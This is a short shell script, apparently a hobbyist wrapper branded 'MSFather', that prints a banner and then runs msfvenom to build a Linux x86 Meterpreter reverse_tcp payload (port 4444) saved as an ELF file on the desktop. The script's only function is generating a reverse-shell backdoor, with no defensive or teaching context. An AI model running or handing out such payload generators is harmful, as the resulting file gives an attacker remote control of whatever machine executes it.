clear 
apt-get install figlet
clear
figlet MSFather
echo "                                           by : Hanux-404"
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=0.0.0.0 LPORT=4444 -o /root/Desktop/MSFather.elf
clear
echo "================================="
echo "=                               ="
echo "= YOUR PAYLOAD IS ON THE DESKTOP="
echo "=                               ="
echo "================================="

